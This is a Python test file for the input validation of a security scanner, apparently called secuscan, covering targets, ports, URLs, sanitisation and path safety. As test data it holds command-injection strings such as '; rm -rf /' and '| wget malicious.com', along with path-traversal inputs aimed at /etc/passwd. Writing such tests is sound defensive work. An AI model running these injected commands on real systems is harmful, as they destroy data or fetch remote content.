import pytest

from backend.secuscan.validation import (
    validate_target,
    validate_port,
    validate_url,
    sanitize_input,
    sanitize_inputs,
    validate_task_inputs,
    extract_target_from_inputs,
    is_safe_path,
    match_pattern,
)


def test_validate_target():
    # Valid IP target
    assert validate_target(
        "192.168.1.1",
        safe_mode=True
    ) == (True, "")

    # Valid hostname target
    assert validate_target(
        "example.com",
        safe_mode=False
    ) == (True, "")

    # Safe mode restrictions
    assert validate_target(
        "8.8.8.8",
        safe_mode=True
    )[0] is False

    # Blocked TLD
    assert validate_target(
        "military.mil",
        safe_mode=True
    )[0] is False

    # Valid private CIDR
    assert validate_target(
        "10.0.0.0/24",
        safe_mode=True
    )[0] is True

    # Invalid hostname
    assert validate_target(
        "not!a!valid!hostname",
        safe_mode=False
    )[0] is False


def test_validate_port():
    assert validate_port(80) == (True, "")
    assert validate_port(65535) == (True, "")

    assert validate_port(0)[0] is False
    assert validate_port(65536)[0] is False
    assert validate_port(-1)[0] is False


def test_validate_url():
    assert validate_url(
        "http://localhost:8080"
    )[0] is True

    assert validate_url(
        "https://example.com/path?param=value"
    )[0] is True

    assert validate_url(
        "http://192.168.1.1"
    )[0] is True

    assert validate_url(
        "ftp://example.com"
    )[0] is False

    assert validate_url(
        "not_a_url"
    )[0] is False

    assert validate_url(
        "http://"
    )[0] is False


def test_sanitize_input():
    # Regular input should remain unchanged
    assert sanitize_input(
        "nmap -sV -p 80"
    ) == "nmap -sV -p 80"

    # Dangerous shell characters should be removed
    assert sanitize_input(
        "127.0.0.1; rm -rf /"
    ) == "127.0.0.1 rm -rf /"

    # Valid payload characters should remain intact
    assert sanitize_input(
        "target.com | wget malicious.com"
    ) == "target.com | wget malicious.com"

    assert sanitize_input(
        "test & echo hacked"
    ) == "test & echo hacked"

    assert sanitize_input(
        "https://example.com?a=1&b=2"
    ) == "https://example.com?a=1&b=2"


def test_sanitize_inputs():
    payload = {
        "target": "example.com;",
        "nested": {
            "cmd": "echo hello && whoami"
        }
    }

    sanitized = sanitize_inputs(payload)

    assert ";" not in sanitized["target"]

    # '&' intentionally preserved to avoid mutating valid payloads
    assert sanitized["nested"]["cmd"] == "echo hello && whoami"


def test_extract_target_from_inputs():
    payload = {
        "url": "https://example.com"
    }

    target = extract_target_from_inputs(payload)

    assert target == "https://example.com"


def test_validate_task_inputs_success():
    payload = {
        "target": "192.168.1.1"
    }

    is_valid, error, sanitized = validate_task_inputs(
        payload,
        safe_mode=True
    )

    assert is_valid is True
    assert error == ""
    assert sanitized["target"] == "192.168.1.1"


def test_validate_task_inputs_failure():
    payload = {
        "target": "8.8.8.8"
    }

    is_valid, error, sanitized = validate_task_inputs(
        payload,
        safe_mode=True
    )

    assert is_valid is False

    assert (
        "Public IPs/networks not allowed"
        in error
    )


def test_is_safe_path():
    base = "/opt/secuscan/data"

    assert is_safe_path(
        "report.txt",
        base
    ) is True

    assert is_safe_path(
        "subdir/file.json",
        base
    ) is True

    # Absolute paths outside base
    assert is_safe_path(
        "/etc/passwd",
        base
    ) is False

    # Path traversal attempts
    assert is_safe_path(
        "../../../etc/passwd",
        base
    ) is False

    assert is_safe_path(
        "subdir/../../etc/passwd",
        base
    ) is False


def test_match_pattern():
    assert match_pattern(
        "http_inspector",
        "http_*"
    ) is True

    assert match_pattern(
        "nmap",
        "nmap"
    ) is True

    assert match_pattern(
        "tls_inspector",
        "*inspector"
    ) is True

    assert match_pattern(
        "dirb",
        "http_*"
    ) is False